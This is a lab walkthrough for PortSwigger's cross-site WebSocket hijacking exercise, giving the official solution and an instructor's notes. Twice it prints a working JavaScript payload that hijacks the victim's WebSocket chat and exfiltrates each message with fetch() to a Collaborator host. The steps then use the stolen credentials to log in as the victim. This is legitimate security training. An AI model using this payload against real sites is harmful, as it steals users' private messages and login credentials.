# Lab: Cross-site WebSocket hijacking

URL https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking/lab

Description:
This online shop has a live chat feature implemented using WebSockets.

To solve the lab, use the exploit server to host an HTML/JavaScript payload that uses a [cross-site WebSocket hijacking attack](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking) to exfiltrate the victim's chat history, then use this gain access to their account.

Portswigger Solution:

1. Click "Live chat" and send a chat message.
2. Reload the page.
3. In Burp Proxy, in the WebSockets history tab, observe that the "READY" command retrieves past chat messages from the server.
4. In Burp Proxy, in the HTTP history tab, find the WebSocket handshake request. Observe that the request has no CSRF tokens.
5. Right-click on the handshake request and select "Copy URL".
6. In the browser, go to the exploit server and paste the following template into the "Body" section:
    
    `<script> var ws = new WebSocket('wss://your-websocket-url'); ws.onopen = function() { ws.send("READY"); }; ws.onmessage = function(event) { fetch('https://your-collaborator-url', {method: 'POST', mode: 'no-cors', body: event.data}); }; </script>`
7. Replace `your-websocket-url` with the URL from the WebSocket handshake (`YOUR-LAB-ID.web-security-academy.net/chat`). Make sure you change the protocol from `https://` to `wss://`. Replace `your-collaborator-url` with a payload generated by [Burp Collaborator](https://portswigger.net/burp/documentation/desktop/tools/collaborator).
8. Click "View exploit".
9. Poll for interactions in the Collaborator tab. Verify that the attack has successfully retrieved your chat history and exfiltrated it via Burp Collaborator. For every message in the chat, Burp Collaborator has received an HTTP request. The request body contains the full contents of the chat message in JSON format. Note that these messages may not be received in the correct order.
10. Go back to the exploit server and deliver the exploit to the victim.
11. Poll for interactions in the Collaborator tab again. Observe that you've received more HTTP interactions containing the victim's chat history. Examine the messages and notice that one of them contains the victim's username and password.
12. Use the exfiltrated credentials to log in to the victim user's account.

Instructor notes:

 Click "Live chat" and send a chat message, if we reload the page, or leave to another part of the web application and come back to the live chat, we see that it is saved.

This is interesting because we have to start asking how is it saving this conversation, could we maybe steal someone else conversation?

Okay from here we lets check the broswer console, and lets check the application tab, check out the cookies, and we can inspect the cookie we have in there and we notice two things,

first that we actually have the value of our cookie but also that the same-site attriubte is set to none, and this means that the cookies are insecure and could be subjective to an attack.

Okay so we go to burp suite and assuming we were capturing all of the traffic, lets go to the GET request, and lets see the URL /chat and we see that we have in the response the HTTP/1.1 101 Switching protocol which indicates we can check our Websocket history

From there we inspect the Websocket history and we see

Ping, Pong but also Ready.

Instructor mentions it highlights the fact that before we get the chat history the web socket sends the READY message and then the history loads.

So the instructor crafts the following payload:


`<script> var ws = new WebSocket('wss://your-websocket-url'); ws.onopen = function() { ws.send("READY"); }; ws.onmessage = function(event) { fetch('https://your-collaborator-url', {method: 'POST', mode: 'no-cors', body: event.data}); }; </script>`

for the web socket url we can just utilize the websocket url from our websocket history from burp suite, and for the colloaborator it will have to be from the collaborartor tab on burpsuite

we go back to the portswigger lab, we click on "Go to Exploit Server" and from there we send the crafted payload

If we go back to the web socket history and we click on Poll now we can get some traffic now

and if we look through the history we find a secret password and we can log in as carlos 